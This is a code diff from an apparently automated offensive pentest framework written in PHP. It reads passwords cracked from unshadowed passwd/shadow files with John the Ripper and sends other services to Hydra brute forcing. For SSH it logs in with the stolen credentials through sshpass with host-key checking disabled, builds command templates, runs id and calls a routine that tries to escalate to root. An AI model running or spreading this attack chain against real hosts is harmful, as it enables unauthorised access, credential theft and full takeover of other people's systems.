@@ -415,7 +415,7 @@ $filenames = explode("\n",$test->req_ret_str($query));
 	        $unshadow_file = trim($unshadow_file);
 	        $obj_file = new FILE($unshadow_file);
 	        
-	        $this->requette("john $obj_file->file_path --wordlist:\",$dico\" ");
+	        //$this->requette("john $obj_file->file_path --wordlist:\",$dico\" ");
 	        
 	        $tab_user2pass = $this->req_ret_tab("john --show $obj_file->file_path | grep ':' ");
 	        if (!empty($tab_user2pass))
@@ -423,11 +423,13 @@ $filenames = explode("\n",$test->req_ret_str($query));
 	                if (preg_match('|^(?<user2name>[a-zA-Z0-9\-\_]{1,}):(?<user2cpw>[[:print:]]{1,}):(?<user2uid>[0-9]{1,}):(?<user2gid>[0-9]{1,}):(?<user2full_name>[[:print:]]{0,}):(?<user2home>[[:print:]]{1,}):(?<user2shell>[[:print:]]{1,})|',$user2tmp,$user))
 	                {
 	                   $this->yesAUTH($this->port2id, $user['user2name'], $user['user2cpw'],$user['user2uid'],$user['user2gid'],$user['user2full_name'],$user['user2home'],$user['user2shell'],"crack etc_passwd and shadow with john ");
+	                   $this->req2BD4in(__FUNCTION__,__CLASS__,"$this->ip2where ",1);
 	                   $this->ip2auth();
 	                }
 	        }
 	        
-	        return $this->req2BD4in(__FUNCTION__,__CLASS__,"$this->ip2where ",1);
+	      return 1;
+	        
 	    }
 	}
 	
@@ -1200,7 +1202,36 @@ messages from leaving your internal network and 3) use a proxy server instead of
 		                $protocol = trim($this->req_ret_str("mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$query\"  2>/dev/null | grep -v protocol "));
 		                
 		                $obj_port = new AUTH($this->eth,$this->domain,$this->ip, $port,$protocol);
-		                $obj_port->port2auth4pass4hydra($service_row['service2name'], $user2name,$user2pass);
+		                if ($service_row['service2name']==="ssh"){
+		                    $test = new SERVICE4COM($obj_port->eth,$obj_port->domain,$obj_port->ip, $obj_port->port,$obj_port->protocol);
+		                    $test->poc($this->flag_poc);
+		                    $stream = $test->stream8ssh8passwd($test->ip, $test->port, $user2name,$user2pass);
+		                    
+		                    $template_cmd = "sshpass -p '$user2pass' ssh -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $user2name@$test->ip -p $test->port -C  '%CMD%'";
+		                    list($stream,$template_id,$template_cmd,$template_shell) = $test->stream4check($stream,$template_cmd,$user2name,$user2pass);
+		                    
+		                    if (is_resource($stream)){
+		                        $templateB64_id = base64_encode($template_id);
+		                        $templateB64_cmd = base64_encode($template_cmd);
+		                        $templateB64_shell = base64_encode($template_shell);
+		                        
+		                        $data = "/usr/bin/id";
+		                        $rst_id = $test->stream4result($stream, $data, 10);
+		                        list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $test->parse4id($rst_id);
+		                        $this->article("CREATE Template ID", $template_id);
+		                        $this->article("CREATE Template CMD", $template_cmd);
+		                        $this->article("CREATE Template SHELL", $template_shell);
+		                        $this->pause();
+		                        $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$user2pass);
+		                        $obj_lan->poc($test->flag_poc);
+		                        
+		                        $obj_lan->lan4root();
+		                    }
+		                }
+		                
+		                else $obj_port->port2auth4pass4hydra($service_row['service2name'], $user2name,$user2pass);
+		                
+		                
 		                //$obj_port->port2auth4dico4hydra($service_row['service2name'],$auth_row['user2name']);
 		                		            }
 		            }
